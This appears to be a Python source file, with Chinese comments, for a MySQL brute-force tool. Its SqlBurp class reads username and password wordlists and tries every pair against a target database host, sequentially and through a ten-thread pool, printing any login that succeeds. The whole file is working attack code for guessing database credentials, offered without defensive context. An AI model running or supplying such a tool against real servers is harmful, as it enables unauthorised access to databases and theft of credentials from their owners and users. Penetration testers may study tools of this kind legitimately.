import pymysql
import threading
from concurrent.futures import ThreadPoolExecutor, wait

# 初始化线程锁
g_mutex = threading.Lock()

class SqlBurp(object):

    def __init__(self, host, port):
        self.host = host
        self.port = port


    def connect_sql(self, user_list, password_list):
        flag = False  # 设置一个标志位，爆破数据库用户名和密码成功后，直接退出
        for user in user_list:
            if flag:
                break
            for password in password_list:
                user = user.strip()
                password = password.strip()
                try:
                    if pymysql.connect(host=self.host, port=self.port, user=user, passwd=password):
                        flag = True
                        print('[+]Connected to MySQL Success, find user is {} and password is {} !!!'.format(user, password))
                        return user, password
                        # break
                except pymysql.err.OperationalError as e:
                    # print('[-]Fail to connect to MySQL, user is {} and password is {} '.format(user, password))
                    # print(e)
                    pass

    def connect_db(self, user, password):
        '''
        尝试连接数据库，如果连接成功，返回用户名密码
        :param user:
        :param password:
        :return:
        '''
        db = None
        try:
            db = pymysql.connect(host=self.host, port=self.port, user=user, passwd=password)
            print('[+]Connected to MySQL Success, find user is {} and password is {} !!!'.format(user, password))
            return user, password
            # break
        except pymysql.err.OperationalError as e:
            print('[-]Fail to connect to MySQL, user is {} and password is {} '.format(user, password))
            # print(e)
        finally:
            if db:
                db.close()




    # 读取用户
    def read_user_file(self, user_file):
        try:
            with open(user_file, 'r') as f:
                user_list = f.readlines()
                return user_list
        except Exception as e:
            print("Error read: {}".format(e))

    # 读取密码
    def read_user_password(self, pass_file):
        try:
            with open(pass_file, 'r') as f:
                pass_list = f.readlines()
                return pass_list
        except Exception as e:
            print("Error read: {}".format(e))


    def sqlburp_thread(self, user_file, pass_file):
        '''
        定义一个线程池，开启多线程连接数据库，等待所有线程结束，获取用户名和密码
        :param user_file:
        :param pass_file:
        :return:
        '''
        try:
            pool = ThreadPoolExecutor(max_workers=10)
            thread_list = []
            user_list = self.read_user_file(user_file)
            password_list = self.read_user_password(pass_file)
            for user in user_list:
                for password in password_list:
                    user = user.strip()
                    password = password.strip()
                    feture = pool.submit(self.connect_db, user, password)
                    thread_list.append(feture)
            wait(thread_list)
            for feture in thread_list:
                if feture.result() is not None:
                    print(feture.result())
        except Exception as e:
            print("Error in sqlburp: {}".format(e))

    def start_sql_brup(self):
        user_file = '../tool_data/mysql_user.txt'
        pass_file = '../tool_data/mysql_pass.txt'
        self.sqlburp_thread(user_file, pass_file)


